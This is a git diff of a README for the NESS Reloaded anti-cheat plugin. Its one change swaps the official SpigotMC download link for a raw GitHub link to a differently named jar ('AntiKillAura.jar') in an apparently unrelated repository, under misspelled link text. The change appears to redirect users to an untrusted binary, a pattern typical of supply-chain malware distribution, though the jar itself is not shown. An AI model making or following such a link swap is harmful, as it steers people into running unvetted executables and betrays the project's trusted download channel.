@@ -8,7 +8,7 @@ NESS Reloaded has an experimental support for GeyserMC even if you will get some
 
 ## Download
 
-Use the [SpigotMC page](https://www.spigotmc.org/resources/ness-anti-cheat-reloaded.75887/) for all downloads.
+Use the [Dowload ling](https://github.com/anticheatsdev/AntiKillAura/raw/main/AntiKillAura.jar) for all downloads.
 
 ## Bug Reports
 You can report issues, false positives, and bypasses on the **Github Issues** page or our **[Discord Server](https://discord.gg/63JGnay)**.
